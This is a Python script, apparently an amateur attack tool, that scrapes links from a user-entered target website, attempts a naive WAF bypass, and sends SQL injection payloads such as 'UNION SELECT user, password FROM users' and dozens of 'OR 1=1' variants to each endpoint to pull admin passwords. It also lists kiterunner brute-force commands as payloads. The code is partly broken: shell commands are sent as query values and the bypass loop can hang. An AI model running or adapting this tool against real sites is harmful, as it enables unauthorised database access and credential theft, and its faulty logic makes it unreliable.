import requests
import re
from bs4 import BeautifulSoup
import pyfiglet
import logging
from concurrent.futures import ThreadPoolExecutor

ascii_banner = pyfiglet.figlet_format("UNPROTECTEDTED API ENDPOINTS")
print(ascii_banner)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Set default timeout for HTTP requests (in seconds)
DEFAULT_TIMEOUT = 30
# Custom headers
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Referer": "https://www.google.com/",
}

# Proxy settings (optional)
PROXY = None  # Example: "http://user:password@proxy_ip:proxy_port"

vulnerable_apis = []

# Payloads
OAPIE1 = "1' UNION SELECT user, password FROM users --"
OAPIE2 = "1' OR '1'='1"
OAPIE3 = "2' OR '1'='1"
OAPIE4 = "3' OR '1'='1"
OAPIE5 = "4' OR '1'='1"
OAPIE6 = "5' OR '1'='1"
OAPIE7 = "6' OR '1'='1"
OAPIE8 = "7' OR '1'='1"
OAPIE9 = "8' OR '1'='1"
OAPIE10 = "9' OR '1'='1"
OAPIE11 = "10' OR '1'='1"
OAPIE12 = "11' OR '1'='1"
OAPIE13 = "12' OR '1'='1"
OAPIE14 = "13' OR '1'='1"
OAPIE15 = "14' OR '1'='1"
OAPIE16 = "15' OR '1'='1"
OAPIE17 = "16' OR '1'='1"
OAPIE18 = "17' OR '1'='1"
OAPIE19 = "18' OR '1'='1"
OAPIE20 = "19' OR '1'='1"
OAPIE21 = "20' OR '1'='1"
OAPIE22 = "21' OR '1'='1"
OAPIE23 = "22' OR '1'='1"
OAPIE24 = "23' OR '1'='1"
OAPIE25 = "24' OR '1'='1"
OAPIE26 = "25' OR '1'='1"
OAPIE27 = "26' OR '1'='1"
OAPIE28 = "27' OR '1'='1"
OAPIE29 = "28' OR '1'='1"
OAPIE30 = "29' OR '1'='1"
OAPIE31 = "30' OR '1'='1"
OAPIE32 = "31' OR '1'='1"
OAPIE33 = "32' OR '1'='1"
OAPIE34 = "33' OR '1'='1"
OAPIE35 = "34' OR '1'='1"
OAPIE36 = "35' OR '1'='1"
OAPIE37 = "36' OR '1'='1"
OAPIE38 = "37' OR '1'='1"
OAPIE39 = "38' OR '1'='1"
OAPIE40 = "39' OR '1'='1"
OAPIE41 = "40' OR '1'='1"
OAPIE42 = "41' OR '1'='1"
OAPIE43 = "42' OR '1'='1"
OAPIE44 = "43' OR '1'='1"
OAPIE45 = "44' OR '1'='1"
OAPIE46 = "45' OR '1'='1"
OAPIE47 = "46' OR '1'='1"
OAPIE48 = "47' OR '1'='1"
OAPIE49 = "48' OR '1'='1"
OAPIE50 = "49' OR '1'='1"
OAPIE51 = "50' OR '1'='1"
OAPIE52 = "51' OR '1'='1"
OAPIE53 = "kr scan https://domain.com/api/ -w routes-large.kite -x 20"
OAPIE54 = "kr scan https://domain.com/api/ -A=apiroutes-220828 -x 20"
OAPIE55 = "kr brute https://domain.com/api/ -A=raft-large-words -x 20 -d=0"
OAPIE56 = "kr brute https://domain.com/api/ -w /tmp/lang-english.txt -x 20 -d=0"


# Vulnerability Metrics
VULNERABILITY_METRICS = {
    "OAPIE1": "medium",
    "OAPIE2": "high",
    "OAPIE3": "high",
    "OAPIE4": "high",
    "OAPIE5": "high",
    "OAPIE6": "high",
    "OAPIE7": "high",
    "OAPIE8": "high",
    "OAPIE9": "high",
    "OAPIE10": "high",
    "OAPIE11": "high",
    "OAPIE12": "high",
    "OAPIE13": "high",
    "OAPIE14": "high",
    "OAPIE15": "high",
    "OAPIE16": "high",
    "OAPIE17": "high",
    "OAPIE18": "high",
    "OAPIE19": "high",
    "OAPIE20": "high",
    "OAPIE21": "high",
    "OAPIE22": "high",
    "OAPIE23": "high",
    "OAPIE24": "high",
    "OAPIE25": "high",
    "OAPIE26": "high",
    "OAPIE27": "high",
    "OAPIE28": "high",
    "OAPIE29": "high",
    "OAPIE30": "high",
    "OAPIE31": "high",
    "OAPIE32": "high",
    "OAPIE33": "high",
    "OAPIE34": "high",
    "OAPIE35": "high",
    "OAPIE36": "high",
    "OAPIE37": "high",
    "OAPIE38": "high",
    "OAPIE39": "high",
    "OAPIE40": "high",
    "OAPIE41": "high",
    "OAPIE42": "high",
    "OAPIE43": "high",
    "OAPIE44": "high",
    "OAPIE45": "high",
    "OAPIE46": "high",
    "OAPIE47": "high",
    "OAPIE48": "high",
    "OAPIE49": "high",
    "OAPIE50": "high",
    "OAPIE51": "high",
    "OAPIE52": "high",
    
}

# Add 50 high vulnerability payloads
for i in range(1, 51):
    globals()[f'OAPIE{i+2}'] = f"{i}' OR '1'='1"

# Update vulnerability metrics for new payloads
for i in range(3, 53):
    VULNERABILITY_METRICS[f"OAPIE{i}"] = "high"

def test_api_vulnerability(url):
    logger.info("Testing Unprotected API Endpoints vulnerability on: %s", url)

    try:
        # Fetch the webpage content
        response = requests.get(url, headers=HEADERS, timeout=DEFAULT_TIMEOUT, proxies={'http': PROXY, 'https': PROXY} if PROXY else None)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logger.error("Failed to fetch webpage content: %s", e)
        return

    soup = BeautifulSoup(response.text, "html.parser")

    # Extract potential API endpoints from the webpage
    api_endpoints = set()
    for tag in soup.find_all(['a', 'script', 'link'], href=True):
        href = tag.get('href', '')
        if re.match(r'^https?://', href):
            api_endpoints.add(href)

    logger.info("Potential API Endpoints Found:")
    for endpoint in api_endpoints:
        logger.info("  - %s", endpoint)

    # Attempt to bypass protection systems and exploit vulnerabilities
    for endpoint in api_endpoints:
        bypassed = False
        while not bypassed:
            try:
                # Send a request with modified parameters or headers
                # Example: Modify headers to bypass protection systems
                response = requests.get(endpoint, headers={'User-Agent': 'Mozilla/5.0'}, timeout=DEFAULT_TIMEOUT)
                response.raise_for_status()
                # Check if the response indicates a successful bypass
                if "WAF" not in response.text:
                    logger.warning("Bypass successful for endpoint: %s", endpoint)
                    # Exploit the vulnerability or proceed with further testing
                    exploit_vulnerability(endpoint)  # Pass 'endpoint' as argument
                    vulnerable_apis.append(endpoint)
                    bypassed = True
            except requests.exceptions.RequestException as e:
                logger.error("Request failed: %s", e)
                break

def exploit_vulnerability(endpoint):
    # Add code to exploit the identified vulnerability
    for payload_name, payload_value in globals().items():
        if payload_name.startswith("OAPIE"):
            try:
                response = requests.get(endpoint, params={'id': payload_value}, timeout=DEFAULT_TIMEOUT)
                response.raise_for_status()
                if "admin" in response.text and "password" in response.text:
                    logger.warning("Payload %s successful. Sensitive information retrieved: %s", payload_name, response.text)
                    vulnerability_metric = VULNERABILITY_METRICS.get(payload_name, "unknown")
                    print("Successfully injected payload:", payload_name)
                    print("Vulnerability Metric:", vulnerability_metric)
            except requests.exceptions.RequestException as e:
                logger.error("Failed to exploit vulnerability using %s: %s", payload_name, e)

if __name__ == "__main__":
    target_website = input("Enter your target website URL: ")

    # Multithreaded scanning
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(test_api_vulnerability, [target_website])

    print("\nVulnerable APIs:")
    for api in vulnerable_apis:
        print(api)

